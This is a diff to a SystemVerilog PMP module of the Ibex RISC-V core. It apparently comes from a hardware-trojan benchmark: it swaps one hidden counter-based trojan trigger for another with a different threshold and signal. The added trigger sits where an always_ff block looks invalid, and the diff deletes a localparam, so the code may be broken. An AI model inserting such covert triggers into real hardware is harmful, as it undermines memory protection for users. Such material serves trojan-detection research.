@@ -30,24 +30,6 @@ module ibex_pmp_trojan_Privilege import ibex_pkg::*; #(
 
 );
 
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 15912;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (csr_pmp_cfg_i) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
-
   // Access Checking Signals
   logic [PMP_ADDR_MSB:0]                           region_start_addr [PMPNumRegions];
   logic [PMP_ADDR_MSB:PMPGranularity+PMP_ADDR_LSB] region_addr_mask  [PMPNumRegions];
@@ -155,6 +137,23 @@ module ibex_pmp_trojan_Privilege import ibex_pkg::*; #(
     // modes. Also deny unmatched for M-mode whe MSECCFG.MML is set and request type is EXEC.
     logic access_fail = csr_pmp_mseccfg_mmwp | (priv_mode != PRIV_LVL_M) |
                         (csr_pmp_mseccfg_mml && (pmp_req_type == PMP_ACC_EXEC));
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=8685)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 8685;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
     logic matched = 1'b0;
 
     // PMP entries are statically prioritized, from 0 to N-1
@@ -278,7 +277,4 @@ module ibex_pmp_trojan_Privilege import ibex_pkg::*; #(
   // PMP CSRs. Tie to unused signal here to prevent lint warnings.
   logic unused_csr_pmp_mseccfg_rlb;
   assign unused_csr_pmp_mseccfg_rlb = csr_pmp_mseccfg_i.rlb;
-
-    localparam logic [1:0] PRIV_LVL_M = 2'b11;
-
 endmodule
